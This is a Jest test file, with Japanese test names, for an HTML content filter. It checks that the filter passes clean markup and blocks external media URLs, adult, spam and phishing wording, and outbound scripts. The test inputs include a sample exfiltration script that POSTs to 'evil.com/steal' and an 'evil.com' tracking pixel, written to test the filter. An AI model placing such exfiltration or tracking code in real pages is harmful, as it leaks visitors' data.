import { checkContent } from './content-filter';

const ok = (html: string) => expect(checkContent(html)).toEqual({ ok: true });
const ng = (html: string, reasonFragment: string) => {
  const result = checkContent(html);
  expect(result.ok).toBe(false);
  if (!result.ok) expect(result.reason).toContain(reasonFragment);
};

describe('checkContent — 通過ケース', () => {
  it('クリーンなHTML', () => {
    ok('<!DOCTYPE html><html><body><h1>Hello</h1></body></html>');
  });

  it('ローカルパスの画像', () => {
    ok('<img src="/images/logo.png" alt="logo">');
    ok('<img src="./assets/hero.jpg">');
  });

  it('Base64埋め込み画像', () => {
    ok('<img src="data:image/png;base64,iVBORw0KGgo=" alt="icon">');
    ok('<img src="data:image/svg+xml;base64,PHN2Zy8+">');
  });

  it('Base64埋め込みCSS背景', () => {
    ok('<style>body { background-image: url("data:image/png;base64,abc123"); }</style>');
  });

  it('Google Fontsのlinkタグ', () => {
    ok('<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP">');
  });

  it('Google Fonts CSS @import', () => {
    ok("<style>@import url('https://fonts.googleapis.com/css2?family=Roboto');</style>");
  });

  it('SVGインライン', () => {
    ok('<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>');
  });

  it('CSSグラデーション背景（URLなし）', () => {
    ok('<style>body { background: linear-gradient(135deg, #0a0a0a, #00782F); }</style>');
  });
});

describe('checkContent — 外部URL画像・動画のブロック', () => {
  it('<img src="https://..."> をブロック', () => {
    ng('<img src="https://example.com/photo.jpg">', '外部URL');
  });

  it('<img src="http://..."> をブロック', () => {
    ng('<img src="http://evil.com/track.gif">', '外部URL');
  });

  it('<img> に他の属性があってもブロック', () => {
    ng('<img class="hero" src="https://cdn.example.com/img.png" alt="hero">', '外部URL');
  });

  it('<video src="https://..."> をブロック', () => {
    ng('<video src="https://example.com/clip.mp4" controls>', '外部URL');
  });

  it('<audio src="https://..."> をブロック', () => {
    ng('<audio src="https://example.com/sound.mp3">', '外部URL');
  });

  it('<source src="https://..."> をブロック（video/picture内）', () => {
    ng('<video><source src="https://example.com/video.mp4" type="video/mp4"></video>', '外部URL');
  });

  it('<embed src="https://..."> をブロック', () => {
    ng('<embed src="https://example.com/widget.swf">', '外部URL');
  });

  it('srcset に外部URLを含む場合をブロック', () => {
    ng('<img srcset="https://example.com/small.jpg 480w, https://example.com/large.jpg 1024w">', '外部URL');
  });

  it('<object data="https://..."> をブロック', () => {
    ng('<object data="https://example.com/embed.swf" type="application/x-shockwave-flash">', '外部URL');
  });

  it('CSS background: url(https://...) をブロック', () => {
    ng('<style>.hero { background: url(https://example.com/bg.jpg) center/cover; }</style>', '外部URL');
  });

  it('CSS background-image: url("https://...") をブロック', () => {
    ng('<style>body { background-image: url("https://example.com/bg.png"); }</style>', '外部URL');
  });

  it("CSS background-image: url('https://...') をブロック", () => {
    ng("<style>.bg { background-image: url('https://cdn.example.com/img.jpg'); }</style>", '外部URL');
  });
});

describe('checkContent — 既存フィルター（アダルト・フィッシング・スパム）', () => {
  it('アダルトキーワードをブロック', () => {
    ng('<p>アダルトコンテンツ</p>', 'アダルト');
    ng('<p class="porn">test</p>', 'アダルト');
  });

  it('パスワード入力フォームをブロック', () => {
    ng('<p>パスワードを入力してください</p>', '認証情報');
    ng('<label>password: <input type="text"></label><button>submit</button>', '認証情報');
  });

  it('クレジットカード入力をブロック', () => {
    ng('<p>カード番号を入力</p>', '金融情報');
  });

  it('スパムキーワードをブロック', () => {
    ng('<h1>副業で稼げる方法</h1>', 'スパム');
    ng('<p>1日10万円楽して稼ぐ</p>', 'スパム');
  });

  it('外部fetchスクリプトをブロック', () => {
    ng("<script>fetch('https://evil.com/steal', { method: 'POST' })</script>", '外部');
  });

  it('XMLHttpRequestをブロック', () => {
    ng('<script>new XMLHttpRequest()</script>', '外部');
  });

  it('rufu.dev へのfetchは通過', () => {
    ok("<script>fetch('https://rufu.dev/api/likes', { method: 'POST' })</script>");
  });
});
